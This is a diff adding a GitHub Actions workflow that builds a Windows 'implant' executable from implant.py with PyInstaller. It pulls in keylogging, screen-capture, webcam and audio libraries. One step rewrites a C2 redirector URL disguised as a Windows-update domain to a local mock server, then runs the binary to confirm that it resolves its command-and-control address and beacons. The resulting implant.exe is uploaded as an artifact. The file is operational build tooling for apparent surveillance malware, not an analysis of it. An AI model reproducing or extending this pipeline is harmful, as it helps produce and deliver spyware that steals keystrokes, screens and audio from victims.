@@ -1,0 +1,120 @@
+name: Build Implant
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:  # Allows manual trigger
+
+jobs:
+  build-windows:
+    runs-on: windows-latest
+    timeout-minutes: 30
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'  # Stable version with good PyInstaller support
+
+      - name: Install dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install pyinstaller==6.10.0  # Pin a known-good version
+          pip install requests cryptography mss opencv-python pyaudio keyboard pywin32 wmi pillow
+
+      - name: Build with PyInstaller
+        run: |
+          pyinstaller --onefile `
+            --name implant `
+            --add-data "implant.py;." `
+            --hidden-import=keyboard `
+            --hidden-import=pywin32 `
+            --hidden-import=wmi `
+            --hidden-import=PIL `
+            --hidden-import=cv2 `
+            --hidden-import=mss `
+            --hidden-import=pyaudio `
+            --collect-all mss `
+            --collect-all opencv_python `
+            --collect-all pyaudio `
+            --collect-all keyboard `
+            implant.py
+
+      - name: Check binary size
+        id: size_check
+        shell: pwsh
+        run: |
+          $binary = "dist/implant.exe"
+          if (!(Test-Path $binary)) {
+            Write-Error "Binary not found!"
+            exit 1
+          }
+          $sizeMB = (Get-Item $binary).Length / 1MB
+          Write-Host "Binary size: $sizeMB MB"
+          if ($sizeMB -gt 50) {
+            Write-Error "Binary too large (>50 MB): $sizeMB MB"
+            exit 1
+          }
+          echo "size_mb=$sizeMB" >> $env:GITHUB_OUTPUT
+
+      - name: Execution test - Verify C2 URL output
+        id: exec_test
+        timeout-minutes: 3
+        run: |
+          # Mock the redirector to return a fake C2 URL quickly
+          $mockHtml = @"
+          <!DOCTYPE html>
+          <html>
+          <body>
+            <div id="sysupdate">https://fake-c2.example.com/</div>
+          </body>
+          </html>
+          "@
+          # Start a temporary local web server on port 80 (requires admin, but GitHub runners allow)
+          # Use Python HTTP server on a high port instead to avoid permission issues
+          Start-Job -ScriptBlock {
+            python -m http.server 8080 --directory "$env:RUNNER_TEMP/mock"
+          }
+          Start-Sleep -Seconds 2
+          New-Item -ItemType Directory -Path "$env:RUNNER_TEMP/mock" -Force
+          Set-Content -Path "$env:RUNNER_TEMP/mock/index.html" -Value $mockHtml
+
+          # Override REDIRECTOR_URL via environment variable (modify script temporarily)
+          $scriptPath = "implant.py"
+          (Get-Content $scriptPath) -replace 'REDIRECTOR_URL = "https://windows-updates.vercel.app/"', 'REDIRECTOR_URL = "http://127.0.0.1:8080/"' | Set-Content $scriptPath
+
+          # Run the binary (it will resolve the mock URL and print "[+] Resolved C2: ...")
+          $proc = Start-Process -FilePath "dist/implant.exe" -RedirectStandardOutput "$env:RUNNER_TEMP/output.txt" -PassThru
+          Start-Sleep -Seconds 20  # Allow time for one beacon cycle
+          if (!$proc.HasExited) { Stop-Process -Id $proc.Id -Force }
+
+          $output = Get-Content "$env:RUNNER_TEMP/output.txt" -Raw
+          Write-Host "=== Binary Output ==="
+          Write-Host $output
+          Write-Host "=== End Output ==="
+
+          if ($output -match "\[\\+\] Resolved C2: https://fake-c2\.example\.com/") {
+            Write-Host "SUCCESS: C2 URL detection passed"
+          } else {
+            Write-Error "FAIL: Did not find expected C2 resolution output"
+            exit 1
+          }
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: implant-windows-exe
+          path: dist/implant.exe
+          retention-days: 7
+
+      - name: Summary
+        run: |
+          echo "### Build Summary" >> $env:GITHUB_STEP_SUMMARY
+          echo "- Binary size: ${{ steps.size_check.outputs.size_mb }} MB" >> $env:GITHUB_STEP_SUMMARY
+          echo "- Execution test: Passed" >> $env:GITHUB_STEP_SUMMARY
+          echo "- Artifact: implant.exe" >> $env:GITHUB_STEP_SUMMARY
